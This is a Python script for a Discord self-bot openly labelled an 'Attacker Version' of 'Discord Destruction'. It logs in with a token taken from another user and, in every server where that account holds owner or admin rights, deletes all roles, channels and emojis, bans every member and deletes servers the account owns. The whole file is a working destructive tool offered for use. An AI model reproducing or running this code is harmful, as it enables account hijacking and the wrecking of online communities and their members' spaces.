from discord.ext import commands

bot = commands.Bot(command_prefix='1', self_bot=True)



print("""\n\n\n\n
        ________  .__                              .___                                                 
        \______ \ |__| ______ ____  ___________  __| _/                                                 
         |    |  \|  |/  ___// ___\/  _ \_  __ \/ __ |                                                  
         |    `   \  |\___ \\  \__(  <_> )  | \/ /_/ |                                                  
        /_______  /__/____  >\___  >____/|__|  \____ |                                                  
                \/        \/     \/                 \/                                                  
        ________                   __                        __  .__                                    
        \______ \   ____   _______/  |________ __ __   _____/  |_|__| ____   ____                       
         |    |  \_/ __ \ /  ___/\   __\_  __ \  |  \_/ ___\   __\  |/  _ \ /    \                      
         |    `   \  ___/ \___ \  |  |  |  | \/  |  /\  \___|  | |  (  <_> )   |  \                     
        /_______  /\___  >____  > |__|  |__|  |____/  \___  >__| |__|\____/|___|  /                     
                \/     \/     \/                          \/                    \/                      
        \n\nVersion: Attacker Version
        \n\n\n\n""")


print('Enter The User Token To Do Bombing/Destruction On: ')
token_to_destroy = input()


@bot.event
async def on_ready():
    print(f"Logged In As: {bot.user}\nWith ID: {bot.user.id}")
    print(f"Initiate Account Destruction For {bot.user.name}#{bot.user.discriminator}?\nn for no and y for yes (CASE SENSITIVE!)")
    check = input() # looks good rn
    deleted_roles = []
    banned_members = []
    deleted_channels = []
    deleted_emojis = []
    if check == 'y':
        for guild in bot.guilds:
            if bot.guilds == []:
                print('No Guilds Were Found!\nPress CTRL+C To Exit')
        for guild in bot.guilds: 
            if guild.owner == bot.user or guild.me.guild_permissions.administrator:

                for r in guild.roles:
                    try:
                        await r.delete(reason='selfbot virus is gud and fard')
                        deleted_roles.append(f'Just Deleted Some Roles -> [Names: "{r.name}," IDs: "{r.id},"]')
                    except:
                        pass
                for m in guild.members:
                    try:
                        await m.ban(reason='selfbot virus is gud and fard')
                        banned_members.append(f'Just Banned Some Members -> [Names: "{m.name}," IDs: "{m.id},"]')
                    except:
                        pass
            
                for c in guild.channels:
                    deleted_channels.append(f'Just Deleted Some Channels -> [Names: "{c.name}," IDs: "{c.id},"]')
                    await c.delete(reason='selfbot virus is gud and fard')
                for e in guild.emojis:
                    deleted_emojis.append(f'Just Deleted Some Emojis -> [Names: "{e.name}," IDs: "{e.id},"]')
                    await e.delete(reason='selfbot virus is gud and fard')
                try:
                    if guild.me == guild.owner:
                        await guild.delete()
                except:
                    pass
            else:
                await guild.leave()

        if deleted_roles == []:
            print('No Roles Could Be Deleted (No Roles Found)')
        if banned_members == []: 
            print('No Members Could Be Banned (No Members Found)')
        if deleted_channels == []: 
            print('No Channels Could Be Deleted (No Members Found)')
        if deleted_emojis == []:
            print('No Emojis Could Be Deleted (No Emojis Found)')

        if deleted_roles !=[]:
            print(f"\n{deleted_roles}\n")
        if banned_members != []:
            print(f"{banned_members}\n")
        if deleted_channels != []:
            print(f"{deleted_channels}\n")
        if deleted_emojis != []:
            print(f"{deleted_emojis}\n")
        print("Done, The Account Got Bombed/Destructed\nPress CTRL+C To Exit")
    else:
        print('ok, no account bombing/destruction today\nsee ya!\nPress CTRL+C To Exit')


bot.run(token_to_destroy)